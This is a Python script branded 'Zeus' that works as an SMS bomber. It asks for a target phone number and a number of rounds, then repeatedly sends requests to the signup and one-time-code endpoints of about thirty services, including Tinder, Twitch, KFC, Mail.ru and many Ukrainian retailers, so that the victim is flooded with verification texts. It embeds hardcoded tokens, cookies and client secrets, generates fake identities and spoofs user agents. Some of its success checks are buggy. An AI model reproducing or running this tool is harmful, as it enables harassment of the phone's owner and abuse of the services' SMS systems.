import requests, random, os, json, re, sys, colorama, ctypes, telebot, user_agent, datetime, time
from colorama import Fore
import getpass
os_name = os.environ['COMPUTERNAME']
user_name = getpass.getuser()
os_info = f"{Fore.CYAN}{user_name}@{os_name}~\n${Fore.RESET} "
colorama.init()
def title(text):
    if sys.platform.startswith("win"):
        ctypes.windll.kernel32.SetConsoleTitleW(text)
title("Zeus is loading... || @siph.er")
def clear():
    if sys.platform.startswith("win"):
        os.system("cls")
    else:
        os.system("clear")
def date_send(text):
    print(f"[{Fore.GREEN}{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}] {text}")
def ui():
    print(f"""
{Fore.CYAN}
                                    ██
  ██████  ███▄ ▄███▓  ██████        ██
▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒        ██
░ ▓██▄   ▓██    ▓██░░ ▓██▄          ██       {Fore.GREEN}by sipher#6969{Fore.CYAN}
  ▒   ██▒▒██    ▒██   ▒   ██▒       ██       {Fore.GREEN}github.com/siph-er{Fore.CYAN}
▒██████▒▒▒██▒   ░██▒▒██████▒▒       ██
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░       ██
░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░       ██
░  ░  ░  ░      ░   ░  ░  ░         ██
      ░         ░         ░         ██                   
{Fore.RESET}
""")
    title("Zeus has loaded. || @siph.er")
def generate_info():
    global _name
    global _email
    global password
    global username
    global _russian
    title("Zeus || Generating Russian Usernames... || @siph.er")
    _russian = "".join(
        [
            random.choice(
                "йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ"
            )
            for x in range(8)
        ]
    )
    title("Zeus || Generating English Usernames... || @siph.er")
    _name = "".join(
        [
            random.choice(
                "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ"
            )
            for x in range(8)
        ]
    )
    title("Zeus || Generating English Passwords... || @siph.er")
    password = "".join(
        [
            random.choice(
                "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ"
            )
            for x in range(11)
        ]
    )
    title("Zeus || Generating Second English Username Section... || @siph.er")
    username = "".join(
        [random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)]
    )
    title("Zeus || Generating Gmail Address... || @siph.er")
    _email = (
            "".join(
                [random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)]
            )
            + "@gmail.com"
    )
    
head = {
    "User-Agent": user_agent.generate_user_agent(device_type="desktop", os=("mac", "linux")),
    "X-Requested-With": "XMLHttpRequest",
}
def main():
    while True:
        clear()
        ui()
        print(f"\n\nEnter the number below:{Fore.CYAN}")
        phone = input(os_info)
        if not phone.startswith("+"):
            print(f"Your number needs to start with a '+' || It must be just numbers, no brackets for state codes or spaces for sections of a number.")
            time.sleep(3)
        else:
            print(f"Enter the amount of rounds below:{Fore.CYAN}")
            try:
                count = int(input(os_info))
            except Exception as e:
                print(f"Error: {e}")
            if count == 0 or count == "":
                print("Insuffient number of rounds.")
            else:
                title("Zeus || Generating Informaton... || @siph.er")
                generate_info()
                time.sleep(2)
                for x in range(count):
                    clear()
                    ui()
                    print(f"Number: {phone}")
                    print(f"Number of rounds: {count}")
                    print(f"Current round: {x+1}")
                    title(f"Zeus || SMS Spammer Starting Round {x+1}... || Number: {phone} || Rounds: {count} || Provider Being Used: Moyo || @siph.er")     
                    moyo = requests.post("https://www.moyo.ua/identity/registration",data={"firstname": _russian, "phone": phone, "email": _email},headers=head,timeout=2)
                    moyo = moyo.json()
                    if moyo['status'] == False:
                        date_send(f"{Fore.RED}Moyo Telecom API did not authenticate the number.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Koronapay || @siph.er") 
                    koronapay = requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone},headers=head,timeout=2)
                    try:
                        koronapay = koronapay.json()
                        date_send(f"{Fore.RED}Koronapay did not authenticate, due to rate limit. Code {koronapay['code']}{Fore.RESET}")
                    except:
                        date_send(f"{Fore.GREEN}Korona pay has successfully authenticated.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: n13423.yclients || @siph.er") 
                    frisor = {
                        "Content-type": "application/json",
                        "Accept": "application/json, text/plain",
                        "authorization": "Bearer yusw3yeu6hrr4r9j3gw6",
                        "User-Agent": user_agent.generate_user_agent(
                            device_type="desktop", os=("mac", "linux")
                        ),
                        "cookie": "auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1",
                    }
                    yclients = requests.post(
                        "https://n13423.yclients.com/api/v1/book_code/312054",
                        data={"phone": phone},
                        headers=frisor,
                        timeout=2,
                    )
                    try:
                        yclients = yclients.json()
                        if str(yclients['status']) == "false":
                            date_send(f"{Fore.RED}n13423.yclients did not authenticate.{Fore.RESET}")
                        else:
                            date_send(f"{Fore.GREEN}n13423.yclients authenticated!{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}n13423.yclients did not authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Kasta || @siph.er") 
                    kasta = requests.post("https://kasta.ua/api/v2/login/", data={"phone": phone}, timeout=2)
                    if "403 Forbidden" in kasta.text:
                        date_send(f"{Fore.RED}Kasta did not authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}Kasta authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: IZI || @siph.er")
                    izi = requests.post("https://izi.ua/api/auth/register", json={"phone": "+" + phone,"name": _russian,"is_terms_accepted": "true"}, headers=head, timeout=2)
                    try:
                        izi = izi.json()
                        if str(izi['status']) == "false":
                            date_send(f"{Fore.RED}IZI did not authenticate.{Fore.RESET}")
                        else:
                            date_send(f"{Fore.GREEN}IZI authenticated!{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}IZI did not authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Junker Kiev || @siph.er")
                    requests.post("https://junker.kiev.ua/postmaster.php",data={"tel": phone, "name": _name, "action": "callme"},timeout=2)
                    date_send(f"{Fore.RED}Junker Kiev did not authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Allo || @siph.er")
                    try:
                        allo = requests.post("https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",data={"firstname": _russian,"telephone": phone,"email": _email,"password": password,"form_key": "Zqqj7CyjkKG2ImM8"},headers=head,timeout=2)
                        allo = allo.json()
                        try:
                            if allo['results']['errors'] in allo:
                                date_send(f"{Fore.RED}Allo did not authenticate.{Fore.RESET}")
                        except:
                            date_send(f"{Fore.GREEN}IZI authenticated!{Fore.RESET}")
                    except Exception as e:
                        date_send(f"{Fore.RED}Allo did not authenticate: {e}{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Zakaz || @siph.er")
                    zakaz = requests.post(
                        "https://stores-api.zakaz.ua/user/signup/",
                        json={"phone": phone},
                        headers={
                            "Accept": "*/*",
                            "Content-Type": "application/json",
                            "Referer": "https://megamarket.zakaz.ua/ru/products/megamarket00000000122023/sausages-farro/",
                            "User-Agent": user_agent.generate_user_agent(
                                device_type="desktop", os=("mac", "linux")
                            ),
                            "x-chain": "megamarket",
                        },
                    )
                    try:
                        if zakaz.json()['errors'] in zakaz.json():
                            date_send(f"{Fore.RED}Zakaz did not authenticate.{Fore.RESET}")
                        else:
                            date_send(f"{Fore.GREEN}Zakaz authenticated!{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}Zakaz did not authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Youla || @siph.er")
                    youla = requests.post(
                        "https://youla.ru/web-api/auth/request_code",
                        data={"phone": phone},
                        headers=head,
                        timeout=2,
                    )
                    try:
                        if youla['code_length'] in youla:
                            date_send(f"{Fore.GREEN}Youla authenticated!{Fore.RESET}")
                        else:
                            date_send(f"{Fore.RED}Youla didnt authenticate.{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}Youla didnt authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Mail.RU || @siph.er")
                    cloudru = requests.post(
                        "https://cloud.mail.ru/api/v2/notify/applink",
                        json={
                            "phone": phone,
                            "api": 2,
                            "email": _email,
                            "x-email": "x-email",
                        },
                        headers=head,
                        timeout=2,
                    )
                    try:
                        if cloudru.json()['body'] == {}:
                            date_send(f"{Fore.GREEN}Mail.RU authenticated!{Fore.RESET}")
                        else:
                            date_send(f"{Fore.RED}Mail.RU didnt authenticate.{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}Mail.RU didnt authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: BELTELECOM || @siph.er")
                    beltelecom = requests.post(
                        "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
                        data={"phone": phone},
                        headers=head,
                        timeout=2,
                    )
                    try:
                        if beltelecom.json()['error'] in beltelecom.json():
                            date_send(f"{Fore.RED}BELTELECOM didnt authenticate.{Fore.RESET}")
                        else:
                            date_send(f"{Fore.GREEN}BELTELECOM authenticated!{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}BELTELECOM didnt authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: SportsMaster || @siph.er")
                    sportsmaster = requests.post(
                        f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={phone}",
                        headers=head,
                        timeout=2,
                    )
                    try:
                        if sportsmaster['error'] in sportsmaster:
                            date_send(f"{Fore.RED}SportsMaster didnt authenticate.{Fore.RESET}")
                        else:
                            date_send(f"{Fore.GREEN}SportsMaster authenticated!{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}SportsMaster didnt authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Tinder || @siph.er")
                    try:
                        tinder = requests.post(
                            "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                            data={"phone_number": phone},
                            headers=head,
                            timeout=2,
                        )
                        if "connection failure" in tinder.text:
                            date_send(f"{Fore.RED}Tinder didnt authenticate.{Fore.RESET}")
                        else:
                            date_send(f"{Fore.GREEN}Tinder authenticated!{Fore.RESET}")
                    except Exception as e:
                        date_send(f"{Fore.RED}Tinder didnt authenticate: {e}{Fore.RESET}")
                    requests.post(
                        "https://crm.getmancar.com.ua/api/veryfyaccount",
                        json={
                            "phone": phone,
                            "grant_type": "password",
                            "client_id": "gcarAppMob",
                            "client_secret": "SomeRandomCharsAndNumbersMobile",
                        },
                        headers=head,
                        timeout=2,
                    )
                    date_send(f"{Fore.GREEN}GetManCar authenticated!{Fore.RESET}")
                    icq = requests.post(
                        "https://www.icq.com/smsreg/requestPhoneValidation.php",
                        data={
                            "msisdn": phone,
                            "locale": "en",
                            "countryCode": "ru",
                            "version": "1",
                            "k": "ic1rtwz1s1Hj1O0r",
                            "r": "46763",
                        },
                        headers=head,
                        timeout=2,
                    )
                    try:
                        if icq.json()['response']['statusCode'] == 200:
                            date_send(f"{Fore.GREEN}ICQ authenticated!{Fore.RESET}")
                        else:
                            date_send(f"{Fore.RED}ICQ didnt authenticate.{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}ICQ didnt authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Pozichka || @siph.er")
                    pozichka = requests.post(
                        "https://api.pozichka.ua/v1/registration/send",
                        json={"RegisterSendForm": {"phone": phone}},
                        headers=head,
                        timeout=2,
                    )
                    if "не вірне." in pozichka.text:
                        date_send(f"{Fore.RED}Pozichka didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}Pozichka authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: SecureOnline || @siph.er")
                    _secureonline = requests.post(
                        "https://secure.online.ua/ajax/check_phone/",
                        params={"reg_phone": phone},
                        headers=head,
                        timeout=2,
                    )
                    if str(_secureonline.json()['res']) == "false":
                        date_send(f"{Fore.RED}SecureOnline didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}SecureOnline authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: City24 || @siph.er")
                    city24 = requests.post(
                        "https://city24.ua/personalaccount/account/registration",
                        data={"PhoneNumber": phone},
                        headers=head,
                        timeout=2,
                    )
                    if "denied" in city24.text:
                        date_send(f"{Fore.RED}City24 didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}City24 authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: AccountMyGames || @siph.er")
                    account_my_games = requests.post(
                        "https://account.my.games/signup_send_sms/",
                        data={"phone": phone},
                        headers=head,
                        timeout=2,
                    )
                    if "Invalid code" in account_my_games.text:
                        date_send(f"{Fore.RED}AccountMyGames didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}AccountMyGames didnt authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Multiplex || @siph.er")
                    try:
                        multiplex = requests.post(
                            "https://auth.multiplex.ua/login",
                            json={"login": phone},
                            headers=head,
                            timeout=2,
                        )
                        if "Bad Request" in multiplex.text:
                            date_send(f"{Fore.RED}Multiplex didnt authenticate.{Fore.RESET}")
                        else:
                            date_send(f"{Fore.GREEN}Multiplex authenticated!{Fore.RESET}")
                    except:
                        date_send(f"{Fore.RED}Multiplex didnt authenticate.{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: RuTube || @siph.er")
                    rutube = requests.post(
                        "https://rutube.ru/api/accounts/sendpass/phone",
                        data={"phone": phone},
                        headers=head,
                        timeout=2,
                    )
                    if '"success" : false' in rutube.text:
                        date_send(f"{Fore.RED}RuTube didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}RuTube authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: MVideo || @siph.er")
                    mvideo = requests.post(
                        "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                        params={"pageName": "registerPrivateUserPhoneVerification"},
                        data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""},
                        headers=head,
                        timeout=2,
                    )
                    if 'Access Blocked' in mvideo.text:
                        date_send(f"{Fore.RED}MVideo didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}MVideo authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Twitch || @siph.er")
                    twitch = requests.post(
                        "https://passport.twitch.tv/register?trusted_request=true",
                        json={
                            "birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                            "include_verification_code": True,
                            "password": password,
                            "phone_number": phone,
                            "username": username,
                        },
                        headers=head,
                        timeout=2,
                    )
                    if not "Verification code was sent" in twitch.text:
                        date_send(f"{Fore.RED}Twitch didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}Twitch authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: NovaLiniya || @siph.er")
                    requests.post(
                        "https://www.nl.ua",
                        data={
                            "component": "bxmaker.authuserphone.login",
                            "sessid": "bf70db951f54b837748f69b75a61deb4",
                            "method": "sendCode",
                            "phone": phone,
                            "registration": "N",
                        },
                        headers=head,
                        timeout=2,
                    )
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: MobilePlanet || @siph.er")
                    mobileplanet = requests.post(
                        "https://mobileplanet.ua/register",
                        data={
                            "klient_name": _name,
                            "klient_phone": phone,
                            "klient_email": _email,
                        },
                        headers=head,
                        timeout=2,
                    )
                    if "The action you have requested is not allowed." in mobileplanet.text:
                        date_send(f"{Fore.RED}MobilePlanet didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}MobilePlanet authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: KFC || @siph.er")
                    kfc = requests.post(
                        "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                        data={"phone": phone},
                        headers=head,
                        timeout=2,
                    )
                    if "errorCode" in kfc.text:
                        date_send(f"{Fore.RED}KFC didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}KFC authenticated!{Fore.RESET}")
                    title(f"Zeus || SMS Spammer Starting Round {x}... || Number: {phone} || Rounds: {count} || Provider Being Used: Viasat || @siph.er")
                    viasat = requests.post(
                        "https://api-production.viasat.ru/api/v1/auth_codes",
                        json={"msisdn": phone},
                        headers=head,
                        timeout=2,
                    )
                    if '"code":"forbidden"' in viasat.text:
                        date_send(f"{Fore.RED}Viasat didnt authenticate.{Fore.RESET}")
                    else:
                        date_send(f"{Fore.GREEN}Viasat authenticated!{Fore.RESET}")
                    requests.post(
                        "https://eda.yandex/api/v1/user/request_authentication_code",
                        json={"phone_number": phone},
                        headers=head,
                        timeout=2,
                    )
                    date_send(f"{Fore.GREEN}Yandex authenticated!{Fore.RESET}")
                print("All rounds have now finished, going to main menu now....")
                time.sleep(2)

main() 